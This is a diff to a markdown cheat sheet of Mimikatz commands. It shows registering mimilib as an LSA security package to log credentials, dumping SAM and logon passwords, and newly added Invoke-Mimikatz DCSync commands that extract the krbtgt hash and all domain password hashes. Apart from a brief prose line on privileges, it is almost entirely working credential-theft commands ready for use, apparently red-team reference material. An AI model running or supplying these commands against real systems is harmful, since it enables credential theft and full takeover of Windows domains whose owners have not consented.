@@ -12,8 +12,6 @@ reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages" /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /t REG_MULTI_SZ
 reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"
 type C:\Windows\System32\kiwissp.log
-
-
 ```
 
 
@@ -26,6 +24,9 @@ mimikatz token::elevate lsadump::sam
 mimikatz "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam"
 mimikatz "lsadump::sam"
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+Invoke-Mimikatz -command '"lsadump::dcsync /user:activebreach.io\krbtgt"'
+Invoke-Mimikatz -command '"lsadump::dcsync /domain:insomnia.io /all /csv"'
+Invoke-Mimikatz -command '"lsadump::dcsync /domain:activebreach.io /user:john"'
 ```
 # Rudimentary Mimikatz
 A privilege is a right granted to an account to perform privileged operations within the operating system. Mimikatz allows the request of privileges for it’s current process to allow it to perform the tasks it needs.
